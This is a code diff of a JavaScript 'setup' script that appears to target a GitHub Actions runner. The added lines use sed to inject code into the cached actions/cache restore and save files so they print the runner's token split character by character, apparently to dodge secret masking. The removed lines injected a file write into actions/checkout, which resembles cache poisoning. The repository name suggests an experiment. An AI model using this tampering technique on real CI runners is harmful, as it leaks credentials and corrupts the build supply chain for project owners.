@@ -5,20 +5,10 @@ console.log("this is a setup.....")
 
 
 
-// let writefs = 'const fs = __importStar(__webpack_require__(747));'
-// cl_process.exec(`sed -i '47713i ${writefs}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
+// print token
+let writecontent = 'console.log(JSON.stringify(token.split("")));';
 
-
-let writecontent = 'const fs = __importStar(__nccwpck_require__(7147));fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
-
-cl_process.exec(`sed -i '1839i ${writecontent}'  /home/runner/work/_actions/actions/checkout/v3/dist/index.js`, (err, stdout, stderr) => {
+cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
@@ -27,16 +17,14 @@ cl_process.exec(`sed -i '1839i ${writecontent}'  /home/runner/work/_actions/acti
     console.log(`stderr: ${stderr}`);
 });
 
-// let skip = 'if (!utils.isExactKeyMatch(primaryKey, state)) {'
-// cl_process.exec(`sed -i '45918s/.*/${skip}/'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
+cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+    if (err){
+        console.log(err);
+        return;
+    }
+    console.log(`stdout: ${stdout.toString()}`);
+    console.log(`stderr: ${stderr}`);
+});
 
 
 
